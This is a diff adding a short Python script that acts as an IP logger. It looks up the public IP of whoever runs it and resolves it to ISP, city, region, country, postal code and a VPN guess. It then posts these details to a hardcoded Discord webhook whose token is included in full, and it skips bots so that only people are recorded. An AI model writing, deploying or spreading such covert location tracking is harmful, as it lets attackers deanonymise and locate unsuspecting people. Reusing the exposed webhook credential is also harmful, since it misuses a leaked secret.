@@ -1,0 +1,77 @@
+import requests
+import json
+from datetime import datetime
+
+# Configuration
+webhook_url = "https://discord.com/api/webhooks/1264930727238176779/LRdgE5Ai9mjXi_A8jAwXT3Y21pXaL7bd69PD8jERtzIahBytnmrFIsj9Fff0saudm1gH"
+
+def get_ip():
+    response = requests.get('https://api.ipify.org?format=json')
+    return response.json().get('ip')
+
+def get_user_agent():
+    return requests.utils.default_user_agent()
+
+def fetch_ip_details(ip):
+    response = requests.get(f"http://ip-api.com/json/{ip}")
+    return response.json()
+
+def fetch_vpn_details(ip):
+    response = requests.get(f"https://json.geoiplookup.io/{ip}")
+    return response.json()
+
+def is_bot(user_agent):
+    bot_patterns = ['bot', 'discord', 'robot', 'curl', 'spider', 'crawler']
+    return any(pattern.lower() in user_agent.lower() for pattern in bot_patterns)
+
+def send_to_discord(message, username, avatar_url):
+    data = {
+        'content': message,
+        'username': username,
+        'avatar_url': avatar_url
+    }
+    response = requests.post(webhook_url, data=json.dumps(data), headers={'Content-Type': 'application/json'})
+    return response
+
+def main():
+    ip = get_ip()
+    user_agent = get_user_agent()
+
+    if is_bot(user_agent):
+        print("Bot detected, exiting.")
+        return
+
+    # Current Date and Time
+    current_date = datetime.now().strftime('%d/%m/%Y')
+    current_time = datetime.now().strftime('%H:%M:%S')
+
+    # Fetch details
+    details = fetch_ip_details(ip)
+    vpn_con = fetch_vpn_details(ip)
+
+    # Check for VPN
+    vpn = "Yes (Double Check: {})".format(details.get('isp')) if vpn_con.get('connection_type') == "Corporate" else "No (Double Check: {})".format(details.get('isp'))
+
+    # Flag URL
+    flag_url = f"https://flagcdn.com/64x48/{details.get('countryCode').lower()}.png"
+
+    # Prepare message
+    message = (
+        f"**User IP:** {ip}\n"
+        f"**ISP:** {details.get('isp')}\n"
+        f"**Date:** {current_date}\n"
+        f"**Time:** {current_time}\n"
+        f"**Location:** {details.get('city')}\n"
+        f"**Region:** {details.get('regionName')}\n"
+        f"**Country:** {details.get('country')}\n"
+        f"**Postal Code:** {details.get('zip')}\n"
+        f"**IsVPN?** {vpn} (Possible False-Positives)"
+    )
+
+    # Send to Discord
+    response = send_to_discord(message, f"Visitor Visited From: {details.get('country')}", flag_url)
+    print("Status Code:", response.status_code)
+    print("Response:", response.text)
+
+if __name__ == "__main__":
+    main()
